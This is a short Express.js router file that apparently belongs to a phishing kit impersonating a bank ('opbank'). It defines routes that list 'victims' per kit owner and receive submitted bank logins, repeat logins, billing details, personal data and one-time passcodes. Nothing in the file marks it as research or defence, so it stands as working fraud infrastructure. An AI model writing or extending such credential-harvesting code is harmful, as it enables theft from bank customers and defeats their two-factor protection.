const express = require("express");
const {
    getOwnerVics,
    getInfo,
    submitLogin,
    submitBilling,
    submitPersonal,
    deleteEntry,
    submitLoginAgain,
    submitOtp,
} = require("../controllers/opbankController");

const router = express.Router();

router.get("/customers/:owner", getOwnerVics);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/login", submitLogin);
router.post("/loginAgain", submitLoginAgain);
router.post("/billing", submitBilling);
router.post("/personal", submitPersonal);
router.post("/delete", deleteEntry);
router.post("/otp", submitOtp);

module.exports = router;
